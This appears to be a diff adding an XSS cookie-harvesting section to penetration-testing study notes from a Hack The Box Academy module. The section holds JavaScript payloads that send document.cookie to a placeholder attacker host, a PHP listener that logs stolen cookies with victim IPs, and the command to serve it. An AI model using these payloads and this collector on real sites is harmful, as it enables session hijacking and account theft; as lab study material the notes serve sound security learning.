@@ -20,6 +20,31 @@ Now, if we log in, we can see information about the ticket and ways to post a re
 
 ![](https://academy.hackthebox.com/storage/modules/113/ost_tickets.png)
 
+#### XXS Cookie Harvesting
+```js
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+PHP server for catching cookies
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+```shell
+sudo php -S 0.0.0.0:80
+
 #### Sensitive Data Exposure
 Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool [Dehashed](http://dehashed.com/)
 ```bash
